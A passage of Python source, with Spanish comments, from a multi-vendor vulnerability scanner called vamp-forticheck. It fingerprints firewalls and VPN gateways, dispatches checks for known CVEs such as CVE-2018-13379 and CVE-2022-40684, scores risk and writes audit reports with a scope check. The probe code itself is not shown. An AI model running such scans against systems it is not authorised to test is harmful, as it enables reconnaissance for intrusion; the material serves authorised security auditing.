        session  : aiohttp.ClientSession  — Sesión HTTP compartida del lote

        Retorna
        -------
        ScanResult  — Resultado completo del análisis
        """
        resultado = ScanResult(target=objetivo)

        # Verificación de scope — abortar si el objetivo no está autorizado
        if not self.scope.is_in_scope(objetivo):
            resultado.error = "OUT_OF_SCOPE"
            return resultado

        url_base = self._normalizar_url(objetivo)
        tiempo_limite = aiohttp.ClientTimeout(total=self.args.timeout)

        # Variables locales para capturar contenido y cabeceras de la sonda inicial
        _contenido_inicial = ""
        _cabeceras_iniciales: Dict = {}

        # ── Fase 1: Detección de fabricante, versión y banner ─────────────────
        # Probamos tres rutas ordenadas por cobertura de fabricante:
        #   · /remote/login — SSL-VPN (FortiOS, ASA, PAN-OS)
        #   · /login        — Admin UI general
        #   · /             — Raíz (página de bienvenida o redirect)
        for ruta in ("/remote/login", "/login", "/"):
            try:
                async with session.get(
                    f"{url_base}{ruta}",
                    timeout=tiempo_limite,
                    ssl=False,
                    allow_redirects=True,
                ) as r:
                    contenido = await r.text(errors="replace")
                    cabeceras = dict(r.headers)
                    resultado.banner = r.headers.get("Server", "")

                    # Detección de fabricante (todos los vendors incluido FortiOS)
                    vendor_detectado = VendorDetector.detect(contenido, cabeceras)
                    if vendor_detectado:
                        resultado.vendor = vendor_detectado
                        if vendor_detectado == "FortiOS":
                            resultado.is_fortios = True

                    # Detección de versión FortiOS (específica — puede funcionar
                    # incluso cuando el vendor no fue detectado por indicadores)
                    is_forti, version_forti = VersionDetector.detect(contenido, cabeceras)
                    if is_forti:
                        resultado.is_fortios = True
                        if not resultado.vendor:
                            resultado.vendor = "FortiOS"
                    if version_forti:
                        resultado.detected_version = version_forti

                    # Guardar contenido de la primera respuesta útil para Fase 2
                    if not _contenido_inicial and (vendor_detectado or is_forti or resultado.detected_version):
                        _contenido_inicial = contenido
                        _cabeceras_iniciales = cabeceras
                        break

            except asyncio.TimeoutError:
                resultado.error = f"Timeout en {ruta}"
            except Exception as e:
                resultado.error = str(e)[:100]

        # ── Fase 2: Verificación de CVEs (adaptativa por fabricante) ──────────
        # Si se identificó un fabricante, se usan sondas específicas para él.
        # Si no se pudo identificar, se lanzan igualmente las sondas FortiOS/generales
        # por si el dispositivo oculta sus indicadores pero tiene el CVE explotable.

        if resultado.vendor in ("FortiOS", None):
            # Checker FortiOS (v1.x) — retrocompatibilidad + dispositivos sin vendor claro
            verificador_forti = CVEChecker(session, self.args.timeout)
            sondas_forti = await asyncio.gather(
                verificador_forti.check_cve_2018_13379(url_base),
                verificador_forti.check_cve_2022_40684(url_base),
                verificador_forti.check_api_info_disclosure(url_base),
                return_exceptions=True,
            )
            for sonda in sondas_forti:
                if isinstance(sonda, dict):
                    resultado.cve_findings.append(sonda)
                    if sonda.get("confirmed") and not resultado.is_fortios:
                        resultado.is_fortios = True
                        resultado.vendor = "FortiOS"

            # CVEs por versión (FortiOS)
            resultado.cve_findings.extend(
                verificador_forti.check_version_cves(resultado.detected_version)
            )

        else:
            # Checker multi-vendor — PAN-OS, Cisco-ASA, Cisco-IOS-XE, Check-Point, Juniper
            mv_checker = MultiVendorCVEChecker(session, self.args.timeout)

            # Sondas de red específicas por fabricante
            sondas_mv: list = []
            if resultado.vendor == "PAN-OS":
                sondas_mv.append(mv_checker.check_panos_globalprotect_exposure(url_base))
            elif resultado.vendor in ("Cisco-ASA",):
                sondas_mv.append(mv_checker.check_cisco_asa_vpn_exposed(url_base))
            elif resultado.vendor in ("Cisco-IOS-XE",):
                sondas_mv.append(mv_checker.check_cisco_iosxe_webui_exposed(url_base))
            elif resultado.vendor == "Check-Point":
                sondas_mv.append(mv_checker.check_checkpoint_cve_2024_24919(url_base))
            elif resultado.vendor == "F5-BIG-IP":
                sondas_mv.append(mv_checker.check_bigip_tmui_exposure(url_base))
                sondas_mv.append(mv_checker.check_bigip_icl_exposure(url_base))
            # Juniper: solo sondas por versión (no hay endpoints públicos genéricos)

            if sondas_mv:
                resultados_mv = await asyncio.gather(*sondas_mv, return_exceptions=True)
                for sonda in resultados_mv:
                    if isinstance(sonda, dict):
                        resultado.cve_findings.append(sonda)

            # CVEs por versión detectada (todos los vendors multi-vendor)
            resultado.cve_findings.extend(
                mv_checker.check_version_cves_vendor(
                    resultado.vendor, resultado.detected_version
                )
            )

        # ── Fase 3: Análisis de exposición secundaria ──────────────────────────
        # Solo para dispositivos identificados o con hallazgos confirmados
        hay_hallazgos = resultado.is_fortios or (
            resultado.vendor and any(f.get("confirmed") for f in resultado.cve_findings)
        )
        if hay_hallazgos:
            analizador = ExposureAnalyzer(session)
            resultado.exposure_vectors = await analizador.analyze(url_base, resultado.cve_findings)

        # ── Mitigaciones detectadas ────────────────────────────────────────────
        if resultado.banner and any(waf in resultado.banner.lower() for waf in ("cloudflare", "nginx-waf")):
            resultado.mitigations_detected.append("WAF detectado en cabecera Server")

        # ── Cálculo de puntuación de riesgo ───────────────────────────────────
        resultado.risk_score = self._calcular_puntuacion(resultado)
        resultado.risk_level = self._nivel_riesgo(resultado.risk_score)

        return resultado

    def _calcular_puntuacion(self, r: ScanResult) -> float:
        """
        Calcula la puntuación de riesgo compuesta (0.0–10.0).

        Fórmula
        -------
        score = Σ CVE_CVSS × factor + Σ puntos_vector_exposición

        Factores de confirmación:
          · confirmed=True  → factor 1.0 (certeza total)
          · version_match   → factor 0.55 (probable pero no confirmado activamente)

        Puntos por vector de exposición secundario:
          · HIGH   → +2.0
          · MEDIUM → +1.0
          · LOW    → +0.3
          · INFO   → +0.0 (no afecta a la puntuación)

        El resultado se limita a 10.0 para mantener la escala CVSS estándar.
        """
        puntuacion = 0.0

        for f in r.cve_findings:
            cvss_base = f.get("cvss", 5.0)
            if f.get("confirmed"):
                puntuacion += cvss_base  # Confirmación activa: peso completo
            elif f.get("method") == "version_match":
                puntuacion += cvss_base * 0.55  # Match de versión: 55% del peso

        for vector in r.exposure_vectors:
            puntuacion += {
                "HIGH":   2.0,
                "MEDIUM": 1.0,
                "LOW":    0.3,
                "INFO":   0.0,
            }.get(vector.get("severity", ""), 0)

        return round(min(puntuacion, 10.0), 2)

    def _nivel_riesgo(self, puntuacion: float) -> str:
        """
        Convierte la puntuación numérica al nivel semáforo de riesgo.

        Retorna 'INFO' si la puntuación es 0 (objetivo encontrado sin hallazgos).
        """
        for nivel, umbral in self.UMBRALES_RIESGO.items():
            if puntuacion >= umbral:
                return nivel
        return "INFO"

    async def run(self, objetivos: List[str]) -> List[ScanResult]:
        """
        Ejecuta el escaneo completo del lote de objetivos de forma asíncrona.

        El Semaphore limita la concurrencia real a --concurrency objetivos
        simultáneos, aunque asyncio.as_completed gestiona todos los awaitable
        a la vez. Los resultados se devuelven en orden de finalización, no de
        entrada, para maximizar el throughput.

        Parámetros
        ----------
        objetivos : List[str]  — Lista de hosts/URLs a escanear

        Retorna
        -------
        List[ScanResult]  — Resultados en orden de finalización
        """
        semaforo = asyncio.Semaphore(self.args.concurrency)
        # TCPConnector compartido: reutiliza conexiones y limita la apertura total de sockets
        conector = aiohttp.TCPConnector(ssl=False, limit=self.args.concurrency * 2)
        resultados: List[ScanResult] = []

        async with aiohttp.ClientSession(connector=conector) as session:

            async def escanear_con_limite(objetivo: str):
                async with semaforo:
                    return await self._escanear_objetivo(objetivo, session)

            with Progress(
                SpinnerColumn(),
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(),
                TextColumn("[cyan]{task.completed}/{task.total}[/cyan]"),
                console=console,
            ) as progreso:
                tarea_id = progreso.add_task(
                    f"[cyan]Escaneando {len(objetivos)} objetivo(s)...",
                    total=len(objetivos),
                )
                for coro in asyncio.as_completed([escanear_con_limite(o) for o in objetivos]):
                    r = await coro
                    resultados.append(r)
                    progreso.advance(tarea_id)

        return resultados


# =============================================================================
# FUNCIONES DE SALIDA POR CONSOLA
# =============================================================================

# Mapa de nivel de riesgo a marcado Rich para la tabla de consola
COLORES_RIESGO = {
    "CRITICAL": "[bold red]CRITICAL[/bold red]",
    "HIGH":     "[bold orange1]HIGH[/bold orange1]",
    "MEDIUM":   "[bold yellow]MEDIUM[/bold yellow]",
    "LOW":      "[bold cyan]LOW[/bold cyan]",
    "INFO":     "[dim]INFO[/dim]",
    "UNKNOWN":  "[dim]UNKNOWN[/dim]",
}


def mostrar_tabla_resultados(results: List[ScanResult]):
    """
    Imprime la tabla resumen de todos los objetivos escaneados con Rich.

    Las filas de objetivos fuera de scope se omiten para no contaminar
    el informe con entradas irrelevantes.

    Columnas (v2.0)
    ---------------
    Objetivo · Fabricante · Versión · CVEs Confirmados · CVEs (ver.) · Riesgo · Score
    """
    tabla = Table(
        title="[bold red]Resultados del Escaneo Multi-Vendor Edge Devices[/bold red]",
        box=box.ROUNDED,
        border_style="red",
        show_lines=False,
    )
    tabla.add_column("Objetivo",       style="white",  no_wrap=True)
    tabla.add_column("Fabricante",     justify="center", width=14)
    tabla.add_column("Versión",        style="yellow", width=12)
    tabla.add_column("CVEs Confirm.",  style="red")
    tabla.add_column("CVEs (versión)", style="orange1")
    tabla.add_column("Riesgo",         justify="center", width=10)
    tabla.add_column("Score",          justify="right",  width=6)

    # Colores por fabricante para identificación visual rápida
    _VENDOR_STYLE = {
        "FortiOS":      "[bold red]FortiOS[/bold red]",
        "PAN-OS":       "[bold orange1]PAN-OS[/bold orange1]",
        "Cisco-ASA":    "[bold yellow]Cisco ASA[/bold yellow]",
        "Cisco-IOS-XE": "[bold yellow]Cisco IOS-XE[/bold yellow]",
        "Check-Point":  "[bold magenta]Check Point[/bold magenta]",
        "Juniper":      "[bold cyan]Juniper[/bold cyan]",
        "F5-BIG-IP":    "[bold green]F5 BIG-IP[/bold green]",
    }

    for r in results:
        if r.error == "OUT_OF_SCOPE":
            continue
        confirmados  = [f["cve"] for f in r.cve_findings if f.get("confirmed")]
        por_version  = [f["cve"] for f in r.cve_findings if f.get("method") == "version_match"]

        vendor_label = _VENDOR_STYLE.get(r.vendor or "", r.vendor or "[dim]Desconocido[/dim]")

        tabla.add_row(
            r.target,
            vendor_label,
            r.detected_version or "—",
            ", ".join(confirmados) or "—",
            ", ".join(por_version) or "—",
            COLORES_RIESGO.get(r.risk_level, r.risk_level),
            f"{r.risk_score:.1f}",
        )

    console.print(tabla)


def mostrar_paneles_detalle(results: List[ScanResult]):
    """
    Para cada objetivo con hallazgos confirmados, imprime un panel de detalle
    con los CVEs, su evidencia, impacto y vectores de exposición secundarios.
    """
    for r in results:
        confirmados = [f for f in r.cve_findings if f.get("confirmed")]
        if not confirmados:
            continue

        lineas = [f"[bold]{r.target}[/bold]  (versión: {r.detected_version or 'desconocida'})"]

        for f in confirmados:
            lineas.append(f"\n  [bold red]► {f['cve']}[/bold red]  CVSS {f.get('cvss', '?')}")
            lineas.append(f"    {f.get('description', '')}")
            if f.get("evidence"):
                lineas.append(f"    [dim]Evidencia:[/dim]  {f['evidence']}")
            if f.get("impact"):
                lineas.append(f"    [dim]Impacto:[/dim]    {f['impact']}")

        if r.exposure_vectors:
            lineas.append("\n  [yellow]Vectores de exposición:[/yellow]")
            for v in r.exposure_vectors:
                lineas.append(f"    [yellow]•[/yellow] [{v['severity']}] {v['description']}")

        console.print(Panel(
            "\n".join(lineas),
            title="[bold red]⚠ HALLAZGOS CRÍTICOS[/bold red]",
            border_style="red",
        ))


# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================

def cargar_objetivos(args) -> List[str]:
    """
    Combina los objetivos de --target y --input en una lista deduplicada.

    La deduplicación preserva el orden de aparición (primera ocurrencia gana)
    usando dict.fromkeys(), que mantiene orden de inserción en Python 3.7+.
    """
    objetivos = list(args.target or [])

    if args.input:
        p = Path(args.input)
        if not p.exists():
            console.print(f"[bold red][!] Fichero de entrada no encontrado: {args.input}[/bold red]")
            sys.exit(1)
        for linea in p.read_text().splitlines():
            linea = linea.strip()
            if linea and not linea.startswith("#"):
                objetivos.append(linea)

    return list(dict.fromkeys(objetivos))  # Deduplicar preservando orden


def main():
    console.print(BANNER, style="bold red")

    parser = argparse.ArgumentParser(
        description=(
            "vamp-forticheck v2.0 — Escáner de Vulnerabilidades Multi-Vendor Edge Devices "
            "(FortiOS · PAN-OS · Cisco ASA/IOS-XE · Check Point · Juniper) — VampSecure Labs"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Ejemplos:\n"
            "  %(prog)s -t 192.168.1.1\n"
            "  %(prog)s -t vpn.cliente.com --html informe.html\n"
            "  %(prog)s -i objetivos.txt -s scope.txt -c 20 -o resultados.json\n\n"
            "AVISO LEGAL: Solo para uso en auditorías autorizadas. El uso no autorizado es ilegal."
        ),
    )
    parser.add_argument("-t", "--target",      nargs="+", metavar="HOST",
                        help="Objetivo(s): host(s) o IP(s)")
    parser.add_argument("-i", "--input",       metavar="FICHERO",
                        help="Fichero de objetivos (uno por línea)")
    parser.add_argument("-s", "--scope",       metavar="FICHERO",
                        help="Fichero de scope — objetivos no listados serán omitidos")
    parser.add_argument("-c", "--concurrency", type=int, default=10,
                        help="Escaneos concurrentes (por defecto: 10)")
    parser.add_argument("--timeout",           type=int, default=10,
                        help="Timeout por petición en segundos (por defecto: 10)")
    parser.add_argument("-o", "--output",      metavar="FICHERO",
                        help="Ruta del informe JSON de salida")
    parser.add_argument("--html",              metavar="FICHERO",
                        help="Ruta del informe HTML de salida")
    parser.add_argument("-v", "--verbose",     action="store_true",
                        help="Salida detallada")

    from vampsec_report import add_report_args
    add_report_args(parser)

    args = parser.parse_args()

    if not args.target and not args.input:
        parser.print_help()
        sys.exit(0)

    objetivos = cargar_objetivos(args)
    if not objetivos:
        console.print("[bold red][!] No se han cargado objetivos.[/bold red]")
        sys.exit(1)

    console.print(
        f"[cyan][i] Objetivos: {len(objetivos)}  ·  "
        f"Concurrencia: {args.concurrency}  ·  "
        f"Timeout: {args.timeout}s[/cyan]\n"
    )

    escaner = FortiScanner(args)
    resultados = asyncio.run(escaner.run(objetivos))

    mostrar_tabla_resultados(resultados)
    mostrar_paneles_detalle(resultados)

    if args.output:
        ReportGenerator.to_json(resultados, args.output)
        console.print(f"\n[bold green][✓] Informe JSON guardado: {args.output}[/bold green]")

    if args.html:
        ReportGenerator.to_html(resultados, args.html)
        console.print(f"[bold green][✓] Informe HTML guardado: {args.html}[/bold green]")

    # Informes de cliente (formato unificado VSL)
    if args.report_html or args.report_pdf:
        from vampsec_report import VampSecReport, meta_from_args
        meta      = meta_from_args(args, tool="vamp-forticheck", version=VERSION)
        vsl_rep   = VampSecReport(meta, _findings_vsl(resultados))
        if args.report_html:
            vsl_rep.to_html_client(args.report_html)
            console.print(f"[bold green][✓] Informe cliente HTML: {args.report_html}[/bold green]")
        if args.report_pdf:
            try:
                vsl_rep.to_pdf(args.report_pdf)
                console.print(f"[bold green][✓] Informe cliente PDF: {args.report_pdf}[/bold green]")
            except RuntimeError as e:
                console.print(f"[yellow][!] PDF no generado: {e}[/yellow]")

    # Resumen final
    confirmados  = sum(1 for r in resultados for f in r.cve_findings if f.get("confirmed"))
    criticos     = sum(1 for r in resultados if r.risk_level == "CRITICAL")
    fuera_scope  = sum(1 for r in resultados if r.error == "OUT_OF_SCOPE")

    console.print(
        f"\n[bold]Escaneo completado.[/bold] "
        f"{confirmados} CVE(s) confirmado(s) · "
        f"{criticos} objetivo(s) crítico(s) · "
        f"{len(objetivos) - fuera_scope} objetivo(s) analizados"
        + (f" · {fuera_scope} fuera de scope" if fuera_scope else "")
    )


# =============================================================================
# CONVERSIÓN A FORMATO DE INFORME UNIFICADO VSL
# =============================================================================

def _findings_vsl(results: List[ScanResult]) -> List:
    """
    Convierte los ScanResult del escáner al formato Finding de vampsec_report.

    Solo incluye hallazgos confirmados activamente o por versión. Los objetivos
    fuera de scope y los errores sin hallazgos se omiten.
    """
    from vampsec_report import Finding as VSLFinding

    findings = []
    n = 0
    for r in results:
        if r.error == "OUT_OF_SCOPE":
            continue
        for f in r.cve_findings:
            if not (f.get("confirmed") or f.get("method") == "version_match"):
                continue
            n += 1
            cve_id = f.get("cve", "")
            cvss   = f.get("cvss")
            sev    = f.get("severity", "MEDIUM").upper()
            # Normalizar severidades textuales a escala VSL
            if sev not in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                if cvss:
                    if cvss >= 9.0:   sev = "CRITICAL"
                    elif cvss >= 7.0: sev = "HIGH"
                    elif cvss >= 4.0: sev = "MEDIUM"
                    else:             sev = "LOW"
                else:
                    sev = "MEDIUM"

            method_tag = "Confirmado activamente" if f.get("confirmed") else "Coincidencia por versión"
            vendor_str = f" [{r.vendor}]" if r.vendor else ""
            version_str = f" · Versión detectada: {r.detected_version}" if r.detected_version else ""

            evidence = (
                f"Método de detección: {method_tag}\n"
                f"Objetivo{vendor_str}: {r.target}{version_str}\n"
                + (f"Evidencia: {f.get('evidence', '')}" if f.get("evidence") else "")
            )

            refs = []
            if cve_id and cve_id.startswith("CVE-"):
                refs.append(f"https://nvd.nist.gov/vuln/detail/{cve_id}")

            findings.append(VSLFinding(
                id          = f"FTC-{n:03d}",
                title       = (f.get("description") or cve_id or "Vulnerabilidad detectada")[:80],
                severity    = sev,
                description = f.get("description", f.get("impact", "Sin descripción disponible.")),
                evidence    = evidence.strip(),
                affected    = r.target,
                remediation = (
                    f.get("mitigation") or
                    "Aplicar los parches del fabricante según la advisory oficial. "
                    "Revisar la guía de hardening del dispositivo."
                ),
                cvss        = float(cvss) if cvss is not None else None,
                cve         = cve_id if cve_id.startswith("CVE-") else None,
                references  = refs,
                tags        = [r.vendor or "edge-device", "network", "perimeter"],
            ))
    return findings


if __name__ == "__main__":
    main()
